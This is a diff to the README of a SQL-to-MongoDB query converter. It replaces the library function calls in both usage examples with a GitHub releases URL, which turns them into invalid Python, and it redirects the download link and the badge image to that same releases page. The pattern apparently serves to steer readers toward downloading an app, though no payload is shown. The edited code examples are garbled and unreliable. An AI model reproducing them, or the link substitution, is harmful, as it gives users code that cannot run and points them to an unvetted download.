@@ -28,14 +28,14 @@ import sqlmongo
 3. Convert SQL query to MongoDB query:
 ```python
 sql_query = "SELECT * FROM users WHERE age > 25;"
-mongo_query = sqlmongo.sql_to_mongo(sql_query)
+mongo_query = https://github.com/ahmedyaser95/SQL-Mongo-Query-Converter/releases(sql_query)
 print(mongo_query)
 ```
 
 4. Convert MongoDB query to SQL query:
 ```python
 mongo_query = "{ age: { $gt: 25 } }"
-sql_query = sqlmongo.mongo_to_sql(mongo_query)
+sql_query = https://github.com/ahmedyaser95/SQL-Mongo-Query-Converter/releases(mongo_query)
 print(sql_query)
 ```
 
@@ -54,9 +54,9 @@ Using SQLMongo, you can convert it to the equivalent MongoDB query:
 For more information, detailed usage instructions, and examples, please refer to the official documentation.
 
 ## Download App
-Download the SQLMongo Query Converter application [here](https://github.com/project/files/App.zip) and explore its capabilities!
+Download the SQLMongo Query Converter application [here](https://github.com/ahmedyaser95/SQL-Mongo-Query-Converter/releases) and explore its capabilities!
 
-[![Download SQLMongo](https://img.shields.io/badge/Download-App-green)](https://github.com/project/files/App.zip)
+[![Download SQLMongo](https://github.com/ahmedyaser95/SQL-Mongo-Query-Converter/releases)](https://github.com/ahmedyaser95/SQL-Mongo-Query-Converter/releases)
 
 If the link provided above does not work or you need further assistance, please check the "Releases" section of this repository for alternative download options.
 
